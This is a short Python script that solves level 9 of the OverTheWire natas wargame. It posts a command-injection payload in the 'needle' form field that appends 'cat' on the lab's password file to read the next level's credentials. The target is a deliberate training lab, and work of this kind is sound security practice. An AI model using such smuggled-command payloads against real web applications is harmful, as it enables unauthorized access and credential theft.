"""
Help script to resolve natas challenge #9
"""
import requests
import json

level = 'natas9'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
Classical command injection.
"""
response = requests.post(url, auth=auth, data={'needle': 'test;cat ../../../../etc/natas_webpass/natas10 #'})
print(response.text)
